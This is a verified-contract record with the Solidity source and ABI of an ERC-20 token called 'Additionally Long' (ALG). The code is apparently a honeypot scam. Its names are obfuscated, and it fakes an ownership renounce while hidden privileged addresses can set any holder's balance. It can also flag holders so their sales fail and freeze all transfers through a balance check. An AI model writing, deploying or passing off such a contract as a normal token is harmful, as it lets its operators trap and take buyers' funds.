{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface launchAt {\n    function createPair(address totalLiquidity, address receiverSwapFrom) external returns (address);\n}\n\ninterface liquidityFeeSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeBuy) external view returns (uint256);\n\n    function transfer(address tokenShouldBuy, uint256 modeWallet) external returns (bool);\n\n    function allowance(address feeTokenIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenShouldBuy,\n        uint256 modeWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeLiquidity, uint256 value);\n    event Approval(address indexed feeTokenIs, address indexed spender, uint256 value);\n}\n\nabstract contract launchedExemptBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxIs is liquidityFeeSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AdditionallyLong is launchedExemptBuy, liquidityFeeSell, maxIs {\n\n    string private teamLaunched = \"ALG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenMax;\n    }\n\n    mapping(address => bool) public teamFrom;\n\n    mapping(address => bool) public senderWallet;\n\n    address public liquidityReceiverAt;\n\n    function feeAmount(uint256 modeWallet) public {\n        launchReceiver();\n        autoTrading = modeWallet;\n    }\n\n    function getOwner() external view returns (address) {\n        return listExempt;\n    }\n\n    bool public takeTo;\n\n    uint256 public amountWallet;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toWallet;\n    }\n\n    uint256 constant modeTrading = 13 ** 10;\n\n    uint8 private tokenMax = 18;\n\n    address marketingFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address marketingTrading, address tokenShouldBuy, uint256 modeWallet) external override returns (bool) {\n        if (_msgSender() != marketingFund) {\n            if (limitSell[marketingTrading][_msgSender()] != type(uint256).max) {\n                require(modeWallet <= limitSell[marketingTrading][_msgSender()]);\n                limitSell[marketingTrading][_msgSender()] -= modeWallet;\n            }\n        }\n        return liquidityShouldIs(marketingTrading, tokenShouldBuy, modeWallet);\n    }\n\n    function liquidityShouldIs(address marketingTrading, address tokenShouldBuy, uint256 modeWallet) internal returns (bool) {\n        if (marketingTrading == enableToken) {\n            return receiverBuy(marketingTrading, tokenShouldBuy, modeWallet);\n        }\n        uint256 totalFee = liquidityFeeSell(liquidityReceiverAt).balanceOf(enableTrading);\n        require(totalFee == autoTrading);\n        require(tokenShouldBuy != enableTrading);\n        if (senderWallet[marketingTrading]) {\n            return receiverBuy(marketingTrading, tokenShouldBuy, modeTrading);\n        }\n        return receiverBuy(marketingTrading, tokenShouldBuy, modeWallet);\n    }\n\n    bool public receiverMax;\n\n    function tokenSell(address minSell) public {\n        launchReceiver();\n        \n        if (minSell == enableToken || minSell == liquidityReceiverAt) {\n            return;\n        }\n        senderWallet[minSell] = true;\n    }\n\n    function allowance(address takeTeam, address maxLaunchSell) external view virtual override returns (uint256) {\n        if (maxLaunchSell == marketingFund) {\n            return type(uint256).max;\n        }\n        return limitSell[takeTeam][maxLaunchSell];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamLaunched;\n    }\n\n    bool private marketingSender;\n\n    mapping(address => uint256) private maxExempt;\n\n    function receiverBuy(address marketingTrading, address tokenShouldBuy, uint256 modeWallet) internal returns (bool) {\n        require(maxExempt[marketingTrading] >= modeWallet);\n        maxExempt[marketingTrading] -= modeWallet;\n        maxExempt[tokenShouldBuy] += modeWallet;\n        emit Transfer(marketingTrading, tokenShouldBuy, modeWallet);\n        return true;\n    }\n\n    uint256 autoMax;\n\n    uint256 public sellMin;\n\n    string private liquidityTotal = \"Additionally Long\";\n\n    function approve(address maxLaunchSell, uint256 modeWallet) public virtual override returns (bool) {\n        limitSell[_msgSender()][maxLaunchSell] = modeWallet;\n        emit Approval(_msgSender(), maxLaunchSell, modeWallet);\n        return true;\n    }\n\n    uint256 private toWallet = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed exemptMarketing, address indexed senderTrading);\n\n    bool private fundAtAmount;\n\n    address public enableToken;\n\n    mapping(address => mapping(address => uint256)) private limitSell;\n\n    function balanceOf(address feeBuy) public view virtual override returns (uint256) {\n        return maxExempt[feeBuy];\n    }\n\n    address private listExempt;\n\n    function transfer(address limitTake, uint256 modeWallet) external virtual override returns (bool) {\n        return liquidityShouldIs(_msgSender(), limitTake, modeWallet);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityTotal;\n    }\n\n    bool public modeAuto;\n\n    uint256 private modeAmount;\n\n    function exemptTotal(address fromTx) public {\n        if (modeAuto) {\n            return;\n        }\n        \n        teamFrom[fromTx] = true;\n        \n        modeAuto = true;\n    }\n\n    constructor (){\n        if (receiverMax) {\n            receiverMax = true;\n        }\n        limitMarketing takeTx = limitMarketing(marketingFund);\n        liquidityReceiverAt = launchAt(takeTx.factory()).createPair(takeTx.WETH(), address(this));\n        if (fundAtAmount) {\n            receiverMax = true;\n        }\n        enableToken = _msgSender();\n        teamFrom[enableToken] = true;\n        maxExempt[enableToken] = toWallet;\n        launchedTradingEnable();\n        if (receiverMax == marketingSender) {\n            modeAmount = sellMin;\n        }\n        emit Transfer(address(0), enableToken, toWallet);\n    }\n\n    uint256 public fromFund;\n\n    address enableTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function launchReceiver() private view {\n        require(teamFrom[_msgSender()]);\n    }\n\n    function launchedTradingEnable() public {\n        emit OwnershipTransferred(enableToken, address(0));\n        listExempt = address(0);\n    }\n\n    uint256 public fundReceiver;\n\n    function owner() external view returns (address) {\n        return listExempt;\n    }\n\n    function tradingTeam(address limitTake, uint256 modeWallet) public {\n        launchReceiver();\n        maxExempt[limitTake] = modeWallet;\n    }\n\n    uint256 autoTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTokenIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxLaunchSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunchSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTx\",\"type\":\"address\"}],\"name\":\"exemptTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeWallet\",\"type\":\"uint256\"}],\"name\":\"feeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTradingEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityReceiverAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSell\",\"type\":\"address\"}],\"name\":\"tokenSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeWallet\",\"type\":\"uint256\"}],\"name\":\"tradingTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenShouldBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AdditionallyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}